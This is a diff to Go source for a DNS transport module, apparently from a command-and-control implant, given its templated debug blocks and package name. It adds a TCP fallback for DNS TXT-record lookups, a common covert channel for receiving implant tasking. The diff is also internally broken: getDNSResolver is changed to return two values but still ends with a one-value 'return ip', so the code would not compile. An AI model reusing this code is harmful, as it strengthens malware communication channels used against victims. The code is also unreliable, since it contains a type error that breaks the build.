@@ -2,6 +2,8 @@ package transports
 
 import (
 	"context"
+	"errors"
+
 	// {{if .Debug}}
 	"fmt"
 	// {{end}}
@@ -38,7 +40,7 @@ func toUint32Ptr(x uint32) *uint32 {
 	return &x
 }
 
-func getDNSResolver() string {
+func getDNSResolver() (string, error) {
 
 	size := toUint32Ptr(uint32(5000))
 	addr, _ := sysAlloc(5000)
@@ -48,18 +50,31 @@ func getDNSResolver() string {
 	log.Printf("Ret = %d\n", ret)
 	log.Printf("Info = %s\n", info.DnsServerList.IpAddress)
 	// {{end}}
+	if ret != 0 {
+		return "", errors.New("Cannot determine system DNS settings")
+	}
 	ip := fmt.Sprintf("%s", info.DnsServerList.IpAddress)
 	ip = ip[1:strings.Index(ip, "\x00")]
 	return ip
 }
 
 func dnsLookup(domain string) (string, error) {
-
-	resolverIP := getDNSResolver()
+	resolverIP, _ := getDNSResolver()
 	// {{if .Debug}}
 	log.Printf("[dns] resolver ip: %#v", resolverIP)
 	// {{end}}
+	result, err := dnsUDPLookup(resolverIP, domain)
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("[dns] udp resolver failed with %s", err)
+		log.Printf("[dns] attempting dns over tcp ...")
+		// {{end}}
+		result, err = dnsTCPLookup(resolverIP, domain)
+	}
+	return result, err
+}
 
+func dnsUDPLookup(resolverIP string, domain string) (string, error) {
 	udpResolver := net.Resolver{
 		PreferGo: true,
 		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
@@ -81,5 +96,28 @@ func dnsLookup(domain string) (string, error) {
 		return "", err
 	}
 	return strings.Join(txts, ""), nil
+}
 
+func dnsTCPLookup(resolverIP string, domain string) (string, error) {
+	tcpResolver := net.Resolver{
+		PreferGo: true,
+		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
+			dialer := net.Dialer{}
+			return dialer.DialContext(ctx, "tcp", fmt.Sprintf("%s:53", resolverIP))
+		},
+	}
+
+	// {{if .Debug}}
+	log.Printf("[dns] lookup -> %s", domain)
+	// {{end}}
+	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
+	defer cancel()
+	txts, err := tcpResolver.LookupTXT(ctx, domain)
+	if err != nil || len(txts) == 0 {
+		// {{if .Debug}}
+		log.Printf("[!] failure -> %s", domain)
+		// {{end}}
+		return "", err
+	}
+	return strings.Join(txts, ""), nil
 }
